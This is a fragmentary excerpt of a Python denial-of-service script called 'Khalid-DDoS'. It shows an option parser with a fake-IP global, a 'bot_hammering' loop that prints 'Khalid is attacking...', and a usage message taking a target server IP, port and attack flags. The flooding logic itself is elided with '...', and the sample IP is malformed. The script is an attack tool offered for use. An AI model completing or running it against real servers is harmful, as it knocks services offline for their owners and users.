...
def get_Typer():
	...
	global fake_ip
	global hides
	optp = OptionParser(add_help_option=False,epilog="Khalid-DDoS")
...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[Khalid is attacking...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
...
def usage1():
    console = Console()
    MARKDOWN="""
	usage : python Khalid-DDoS.py [-i] [-p] [-l]
        	-h : help
        	-i : server ip
        	-p : port server 
            ...
            -d : Hide message
	example :
	    python Khalid-DDoS.py -i 12.345.678 -p 80 -l 2"""
    md = Markdown(MARKDOWN)
    console.print(md,style="bold green")
    #sys.exit()
